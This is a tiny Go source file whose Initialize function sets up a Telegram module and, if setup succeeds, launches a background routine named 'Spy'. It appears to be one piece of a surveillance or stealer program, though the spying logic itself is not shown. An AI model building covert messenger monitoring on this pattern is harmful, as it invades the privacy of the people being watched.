package messenger

import (
	"./telegram"
	"time"
)

func Initialize() {
	telegramResult := telegram.Initialize()
	time.Sleep(5 * time.Second)
	if telegramResult {
		go telegram.Spy()
	}
}
